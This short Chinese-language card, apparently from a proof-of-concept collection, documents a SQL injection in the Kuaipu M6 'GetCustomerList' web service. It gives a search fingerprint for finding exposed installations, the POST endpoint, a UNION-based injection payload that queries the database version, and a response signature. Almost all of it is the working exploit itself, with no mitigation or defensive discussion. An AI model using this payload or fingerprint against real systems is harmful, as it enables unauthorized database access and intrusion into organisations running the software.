# 快普M6GetCustomerList存在SQL注入漏洞

快普 ｜ SQL注入 ｜ —
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/wsAutoComplete.asmx/GetCustomerList HTTP/1.1`

**Payload**
```
prefixText=a'+UNION+ALL+SELECT+@@VERSION,NULL--&count=1&contextKey=a
```
- **响应特征**：500